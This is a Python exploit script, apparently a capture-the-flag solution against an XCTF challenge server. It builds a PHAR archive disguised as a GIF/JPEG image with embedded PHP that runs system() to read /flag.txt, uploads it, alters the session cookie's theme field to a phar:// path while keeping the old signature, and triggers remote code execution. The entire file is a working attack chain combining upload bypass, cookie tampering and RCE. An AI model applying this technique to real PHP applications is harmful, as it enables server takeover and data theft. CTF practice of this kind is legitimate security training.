import re,base64,json,subprocess,requests,sys
BASE='http://oj-10-30-15-9-40055.adworld.xctf.org.cn'
cmd='echo FLAG027_BEGIN; cat /flag.txt; echo FLAG027_END'
open('/home/ubuntu/build_027_flag_theme.php','w').write(r'''<?php
@unlink('/home/ubuntu/flag_theme.phar'); @unlink('/home/ubuntu/flag_theme.jpg');
$p = new Phar('/home/ubuntu/flag_theme.phar');
$p->startBuffering();
$code = <<<'EOC'
<?php echo 'RCE027:'; system("'''+cmd.replace('"','\\"')+r'''"); ?>
EOC;
$p->addFromString('x.css', $code);
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$p->setMetadata('meta');
$p->stopBuffering();
copy('/home/ubuntu/flag_theme.phar','/home/ubuntu/flag_theme.jpg');
?>''')
subprocess.run(['php','-d','phar.readonly=0','/home/ubuntu/build_027_flag_theme.php'],check=True)
s=requests.Session()
s.post(BASE+'/signin.php',data={'name':'test027'},allow_redirects=False,timeout=15)
with open('/home/ubuntu/flag_theme.jpg','rb') as f:
    r=s.post(BASE+'/upload.php',files={'file':('flag_theme.jpg',f,'image/jpeg')},allow_redirects=False,timeout=15)
raw_cookie=r.headers.get('Set-Cookie','')
m=re.search(r'session=([^;]+)', raw_cookie)
if not m:
    print('NOCOOKIE'); sys.exit(1)
cookie=m.group(1)
data_b64,sig_b64=cookie.split('.',1)
json_text=base64.urlsafe_b64decode(data_b64 + '='*((4-len(data_b64)%4)%4)).decode()
obj=json.loads(json_text)
saved=obj['flash']['message'].split(': ',1)[1]
obj['theme']='phar://'+saved+'/x'
new_json=json.dumps(obj,separators=(',',':'))
forged=base64.urlsafe_b64encode(new_json.encode()).decode().rstrip('=') + '.' + sig_b64
r=requests.get(BASE+'/',headers={'Cookie':'session='+forged},timeout=30)
print(r.text[:12000])
